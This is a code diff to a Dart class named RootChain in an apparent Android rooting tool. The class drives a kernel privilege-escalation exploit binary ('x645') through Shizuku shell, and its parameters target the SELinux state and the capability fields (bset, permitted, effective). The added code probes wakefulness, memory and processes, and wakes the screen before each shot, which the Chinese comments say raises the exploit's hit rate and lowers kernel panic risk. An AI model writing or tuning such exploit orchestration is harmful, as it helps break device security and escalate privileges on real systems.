@@ -1216,8 +1216,14 @@ class RootChain extends ChangeNotifier {
           'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
           'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
           'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} P645_LOG=$logPath';
-      // 温度闸：>58°C 先降温再打（实测机身烫时命中率崩、panic 概率上升）
+      // 温度闸 + 环境探针
       await _cooldownGate();
+      if (!await _ensureAwake()) {
+        _log('[wake] 屏幕唤不醒，放弃本轮（doze 状态下打必亏）');
+        _stop = true;
+        return;
+      }
+      await _envProbe('permissive');
       _log('[permissive] run ${run + 1}: 开打（约 30–60s）');
       final r = await ShizukuShell.run(
         'cd $workDir && chmod 755 x645 && $env ./x645 2>&1; echo "RC=\$?"',
@@ -1521,6 +1527,7 @@ class RootChain extends ChangeNotifier {
             .take(8)
             .map((c) => _hex(c + BigInt.from(calib.offCapBset)))
             .join(',');
+      await _envProbe('phase1');
       final lg = await _runShot(
         stage: StageId.phase1,
         stageFrom: 1,
@@ -1572,6 +1579,7 @@ class RootChain extends ChangeNotifier {
       final p = _hex(c + BigInt.from(calib.offCapPermitted));
       final ch = _hex(c + BigInt.from(calib.offCapEffective));
       final list = '3:$p:$ch,3:$p:$ch,3:$p:$ch';
+      await _envProbe('phase2');
       final lg = await _runShot(
         stage: StageId.phase2,
         stageFrom: 1,
@@ -1676,6 +1684,58 @@ class RootChain extends ChangeNotifier {
     } catch (_) {
       return 'zone0';
     }
+  }
+
+  /// 开打前的环境探针（用来回答"是不是后台 App 干扰"这类问题）
+  ///
+  /// 每发之前打一行 `[envprobe]`，把**会直接影响竞态/落位/回收**的现场量记下来：
+  /// · 唤醒态（Dozing/Sleep 时命中率会崩，AGENTS 里有硬数据）
+  /// · 内存（MemAvailable / Dirty / SwapFree）—— 页回收竞争的强弱
+  /// · pipe 页预算（`pipe-user-pages-soft/hard`）—— 别的进程占多了，F_SETPIPE_SZ 会 EPERM，
+  ///   载体变小 ⇒ 落位率下降 ⇒ 更容易 panic（日志里的 `v8_pipe first F_SETPIPE_SZ=-1`）
+  /// · 后台进程数 + 内存前三名 —— 直接对应"其它 App 在后台"这个假设
+  Future<void> _envProbe(String tag) async {
+    try {
+      final r = await ShizukuShell.run(
+        'echo W=\$(dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2)'
+        '; echo MA=\$(grep -m1 MemAvailable /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo DIRTY=\$(grep -m1 Dirty /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo SWF=\$(grep -m1 SwapFree /proc/meminfo | tr -s " " | cut -d" " -f2)'
+        '; echo NPROC=\$(ls /proc 2>/dev/null | grep -cE "^[0-9]")'
+        // pipe 页预算文件是 0600，shell 读不到（su 才行）；用 ps 的前三大户间接判断后台压力
+        '; echo TOP=\$(ps -A -o rss,args 2>/dev/null | sort -rn | head -3'
+        ' | sed -E "s/^ +//" | cut -d" " -f1,2 | tr "\\n" ",")');
+      final m = <String, String>{};
+      for (final line in r.out.split('\n')) {
+        final i = line.indexOf('=');
+        if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
+      }
+      final wake = m['W'] ?? '';
+      _log('[envprobe:$tag] 唤醒=$wake 内存可用=${m['MA'] ?? '?'}KB '
+          'Dirty=${m['DIRTY'] ?? '?'}KB swap=${m['SWF'] ?? '?'}KB '
+          '进程=${m['NPROC'] ?? '?'} 前三大户(rssK,名字)=${m['TOP'] ?? '?'}');
+      if (wake.isNotEmpty && wake != 'Awake') {
+        _log('[envprobe:$tag] ⚠ 屏幕不在 Awake（$wake）⇒ 会先点屏唤醒；'
+            '若仍 Dozing/Sleep，命中与落位都会显著变差');
+      }
+    } catch (_) {}
+  }
+
+  /// 确保屏幕是 Awake（Dozing 直接开打必亏）
+  Future<bool> _ensureAwake() async {
+    for (var i = 0; i < 3; i++) {
+      final w = await ShizukuShell.run(
+          'dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2');
+      final v = w.out.trim();
+      if (v == 'Awake') return true;
+      _log('[wake] 当前 $v ⇒ 点屏唤醒（第 ${i + 1}/3 次）');
+      await ShizukuShell.run(
+          'input keyevent 224; svc power stayon true; input tap 540 1200');
+      await _sleep(1500);
+    }
+    final w = await ShizukuShell.run(
+        'dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2');
+    return w.out.trim() == 'Awake';
   }
 
   /// 开打前的温度闸（读 thermal_zone0，单位 m℃）
